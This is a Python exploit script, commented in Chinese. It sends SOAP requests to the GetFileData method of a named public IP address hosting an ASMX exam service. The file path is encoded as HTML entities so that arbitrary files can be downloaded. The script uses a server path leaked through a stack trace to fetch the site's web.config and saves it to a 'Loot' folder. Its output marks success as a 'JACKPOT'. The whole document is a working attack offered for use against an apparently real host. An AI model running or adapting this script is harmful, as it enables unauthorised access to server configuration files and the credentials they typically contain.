import requests
import base64
import os
import xml.etree.ElementTree as ET

# ================= 配置 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
SAVE_DIR = "./Loot_Final_Config"
# =======================================

HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "SOAPAction": "http://tempuri.org/GetFileData", 
    "User-Agent": "Eiven.Exam2021 Client"
}

def to_html_entities(text):
    return "".join(f"&#{ord(c)};" for c in text)

def probe_file(desc, remote_path):
    encoded_path = to_html_entities(remote_path)
    
    soap_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <GetFileData xmlns="http://tempuri.org/">
          <path>{encoded_path}</path>
        </GetFileData>
      </soap:Body>
    </soap:Envelope>"""

    try:
        print(f"[*] 测试目标: {desc}")
        print(f"    Payload: {remote_path}")
        
        response = requests.post(TARGET_URL, data=soap_payload.encode('utf-8'), headers=HEADERS, timeout=15)

        if response.status_code == 200:
            root = ET.fromstring(response.text)
            ns = {'soap': 'http://schemas.xmlsoap.org/soap/envelope/', 'def': 'http://tempuri.org/'}
            result_elem = root.find(".//def:GetFileDataResult", ns)
            
            if result_elem is not None and result_elem.text:
                file_data = base64.b64decode(result_elem.text)
                save_path = os.path.join(SAVE_DIR, "web.config.xml")
                with open(save_path, "wb") as f:
                    f.write(file_data)
                print(f"    [★ JACKPOT] 下载成功！大小: {len(file_data)} bytes")
                print(f"    [+] 保存路径: {save_path}")
                print("    >>> 任意文件下载漏洞实锤！ <<<")
                return True
        elif response.status_code == 500:
             print("    [!] 500 Error - 文件未找到或拒绝访问 (请检查报错详情)")
             # print(response.text) # 需要时取消注释
    except Exception as e:
        print(f"    [!] 异常: {e}")
    return False

if __name__ == "__main__":
    if not os.path.exists(SAVE_DIR):
        os.makedirs(SAVE_DIR)

    print("=== 基于堆栈信息泄露的最终打击 ===")
    
    # 根据堆栈信息 e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\Models\App_Code\Exam2020.asmx.cs
    # 推导出的网站根目录：
    real_target = r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\web.config"
    
    probe_file("真实Web配置", real_target)